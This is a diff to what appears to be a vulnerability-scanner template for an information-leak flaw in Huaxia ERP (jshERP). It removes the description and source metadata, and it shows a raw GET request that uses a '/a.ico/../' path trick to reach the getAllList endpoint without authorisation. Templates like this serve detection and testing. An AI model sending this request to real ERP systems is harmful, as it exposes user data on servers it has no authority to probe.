@@ -3,12 +3,8 @@ info:
   name: 华夏ERP getAllList信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ys1sub6ictp165do'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ys1sub6ictp165do
-    fofa: body="jshERP-boot"
 http:
 - raw:
   - 'GET /jshERP-boot/user/a.ico/../getAllList HTTP/1.1
